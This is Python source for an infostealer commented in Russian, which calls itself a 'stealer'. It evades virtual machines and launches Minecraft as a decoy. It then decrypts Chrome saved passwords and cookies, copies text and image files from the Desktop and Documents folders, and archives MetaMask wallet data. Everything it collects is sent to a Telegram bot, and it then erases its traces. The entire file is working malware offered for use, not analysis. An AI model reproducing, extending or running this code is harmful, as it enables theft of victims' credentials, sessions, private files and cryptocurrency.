import subprocess
import os
import shutil
import sqlite3
import win32crypt
import json
import base64
import requests
import getpass
import platform
import psutil
import time
import threading
import random
from datetime import datetime
import logging
from pathlib import Path

# Настройки
MINECRAFT_PATH = "C:\\Program Files (x86)\\Minecraft Launcher\\MinecraftLauncher.exe"
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, f"stealer_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
TEMP_DIR = "temp_stealer_data"

# Настройка логирования
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Антидетект: проверка на виртуальную машину
def is_vm():
    suspicious_processes = ["vboxservice.exe", "vmtoolsd.exe", "qemu-ga.exe"]
    for process in psutil.process_iter(['name']):
        if process.info['name'].lower() in suspicious_processes:
            logging.warning("Обнаружена виртуальная машина, завершаю работу!")
            return True
    if psutil.cpu_count() <= 2:  # Часто в ВМ мало ядер
        logging.warning("Слишком мало ядер процессора, возможно ВМ!")
        return True
    return False

# Функция для отправки данных в Telegram
def send_to_telegram(message, file_path=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    requests.post(url, data=data)
    if file_path:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": TELEGRAM_CHAT_ID}
            requests.post(url, files=files, data=data)

# Функция для сбора системной информации
def get_system_info():
    info = f"Username: {getpass.getuser()}\n"
    info += f"System: {platform.system()} {platform.release()}\n"
    info += f"Processor: {platform.processor()}\n"
    info += f"RAM: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB\n"
    logging.info("Собрана системная информация")
    return info

# Функция для кражи паролей из Chrome
def steal_chrome_passwords():
    try:
        chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        temp_db = os.path.join(TEMP_DIR, "LoginData")
        if not os.path.exists(TEMP_DIR):
            os.makedirs(TEMP_DIR)
        shutil.copyfile(chrome_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        passwords = []
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            if not username or not encrypted_password:
                continue
            password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
            passwords.append(f"URL: {url}\nUsername: {username}\nPassword: {password}\n---")
        
        conn.close()
        os.remove(temp_db)
        logging.info(f"Украдено {len(passwords)} паролей из Chrome")
        return "\n".join(passwords) if passwords else "Пароли не найдены"
    except Exception as e:
        logging.error(f"Ошибка при краже паролей: {str(e)}")
        return f"Ошибка при краже паролей: {str(e)}"

# Функция для кражи cookies из Chrome
def steal_chrome_cookies():
    try:
        cookies_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")
        temp_cookies = os.path.join(TEMP_DIR, "Cookies")
        shutil.copyfile(cookies_path, temp_cookies)

        conn = sqlite3.connect(temp_cookies)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        
        cookies = []
        for row in cursor.fetchall():
            host, name, encrypted_value = row
            if not encrypted_value:
                continue
            value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
            cookies.append(f"Host: {host}\nName: {name}\nValue: {value}\n---")
        
        conn.close()
        os.remove(temp_cookies)
        logging.info(f"Украдено {len(cookies)} cookies из Chrome")
        return "\n".join(cookies) if cookies else "Cookies не найдены"
    except Exception as e:
        logging.error(f"Ошибка при краже cookies: {str(e)}")
        return f"Ошибка при краже cookies: {str(e)}"

# Функция для поиска и кражи файлов
def steal_files(extensions=[".txt", ".png", ".jpg"]):
    desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
    documents_path = os.path.join(os.environ["USERPROFILE"], "Documents")
    paths = [desktop_path, documents_path]
    stolen_files = []
    for path in paths:
        for root, _, files in os.walk(path):
            for file in files:
                if any(file.endswith(ext) for ext in extensions):
                    file_path = os.path.join(root, file)
                    temp_path = os.path.join(TEMP_DIR, os.path.basename(file_path))
                    shutil.copyfile(file_path, temp_path)
                    stolen_files.append(temp_path)
    logging.info(f"Украдено {len(stolen_files)} файлов")
    return stolen_files

# Функция для кражи данных криптокошельков (пример для MetaMask)
def steal_crypto_wallets():
    try:
        metamask_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
        if os.path.exists(metamask_path):
            temp_wallet = os.path.join(TEMP_DIR, "metamask_data.zip")
            shutil.make_archive(temp_wallet.replace(".zip", ""), "zip", metamask_path)
            logging.info("Украдены данные MetaMask")
            return temp_wallet
        return None
    except Exception as e:
        logging.error(f"Ошибка при краже криптокошельков: {str(e)}")
        return None

# Функция для запуска Minecraft (маскировка)
def launch_minecraft():
    logging.info("Запускаю Minecraft для маскировки...")
    subprocess.Popen(MINECRAFT_PATH)
    time.sleep(10)

# Функция для проверки, запущен ли Minecraft
def is_minecraft_running():
    for process in psutil.process_iter(['name']):
        if 'javaw.exe' in process.info['name']:
            return True
    return False

# Основная функция
def main():
    # Проверка на ВМ
    if is_vm():
        send_to_telegram("🚨 Обнаружена виртуальная машина, завершаю работу!")
        return

    # Запускаем Minecraft для маскировки
    launch_minecraft()
    while not is_minecraft_running():
        logging.info("Ожидаю запуск Minecraft...")
        time.sleep(2)

    # Собираем данные в параллельных потоках
    send_to_telegram("🎯 Новый запуск стилера!")
    
    threads = []
    
    # Системная информация
    def send_system_info():
        system_info = get_system_info()
        send_to_telegram("💻 Системная информация:\n" + system_info)
    threads.append(threading.Thread(target=send_system_info))

    # Кража паролей
    def send_passwords():
        passwords = steal_chrome_passwords()
        send_to_telegram("🔑 Пароли из Chrome:\n" + passwords)
    threads.append(threading.Thread(target=send_passwords))

    # Кража cookies
    def send_cookies():
        cookies = steal_chrome_cookies()
        send_to_telegram("🍪 Cookies из Chrome:\n" + cookies)
    threads.append(threading.Thread(target=send_cookies))

    # Кража файлов
    def send_files():
        files = steal_files()
        for file in files:
            send_to_telegram("📁 Найден файл!", file_path=file)
    threads.append(threading.Thread(target=send_files))

    # Кража криптокошельков
    def send_wallets():
        wallet = steal_crypto_wallets()
        if wallet:
            send_to_telegram("💰 Найден криптокошелёк!", file_path=wallet)
    threads.append(threading.Thread(target=send_wallets))

    # Запускаем все потоки
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    # Очистка следов
    shutil.rmtree(TEMP_DIR, ignore_errors=True)
    logging.info("Следы очищены")

if __name__ == "__main__":
    main()
